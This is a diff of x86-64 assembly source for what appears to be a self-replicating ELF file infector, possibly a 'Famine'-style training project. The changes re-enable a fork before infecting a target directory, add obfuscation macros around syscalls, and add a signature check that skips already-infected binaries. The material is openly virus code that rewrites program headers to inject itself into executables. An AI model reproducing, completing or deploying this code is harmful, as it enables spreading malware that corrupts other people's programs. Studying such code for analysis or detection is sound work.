@@ -245,9 +245,9 @@ DECYPHER
 .enc_start:
 	OBF_GENERIC1
 	mov rax, _fork
-;	syscall
-;	cmp rax, 0
-;	jne _exx_pop
+	syscall
+	cmp rax, 0
+	jne _exx_pop
 
 
 lea rdi, [rel infect_dir] ; load dir str
@@ -407,6 +407,8 @@ check_elf64:
 inject_self:
 	push r13		; save registers in case we need to restore 
 	OBF_OVERWRITE_PUSHR14R15
+
+
 	mov r15, rdi ; save phdr[0] offset to r15
 	mov rdx, qword [rdi + elf64_ehdr.e_entry]
 	movzx rcx, word [rdi + elf64_ehdr.e_phnum]
@@ -436,7 +438,7 @@ inject_self:
 	lea rdi, [rel random]
 	mov rsi, O_RDONLY
 	mov rax, _open
-	syscall					; OPEN /dev/random  EXIT if not work
+	syscall					; OPEN /dev/urandom  EXIT if not work
 	cmp rax, 0
 	jl	_exx_pop
 
@@ -456,15 +458,22 @@ inject_self:
 	mov rax, _close
 	syscall
 
-
-
+OBF_GENERIC1
 ; get target End of file
 	mov rdi, STACK(famine.file_fd) ; target fd to rdi
 	mov rsi, 0 ; offset 0
 	mov rdx, END_SEEK
 	mov rax, _lseek
+OBF_GENERIC1
 	syscall
 	OBF_PUSH_RAX; save eof from lseek to stack
+
+;Here we check a presence of signature in case of a double PT_NOTE crap
+	mov r13, STACK(famine.file_data)
+	add r13, rax
+	sub r13, BEGIN_SIGNATURE_OFFSET_FORM_END
+	cmp byte[r13], 'F'
+	je .return_pop
 
 	; get delta  ( address at execution time)
 	call .delta
@@ -615,6 +624,10 @@ inject_self:
 
 	mov rax, _sync
 	syscall
+	jmp .return
+	.return_pop:
+	OBF_POP_RAX
+	OBF_POP_RDI
 	.return :
 		pop r15		; restore saved registers
 	OBF_GENERIC1
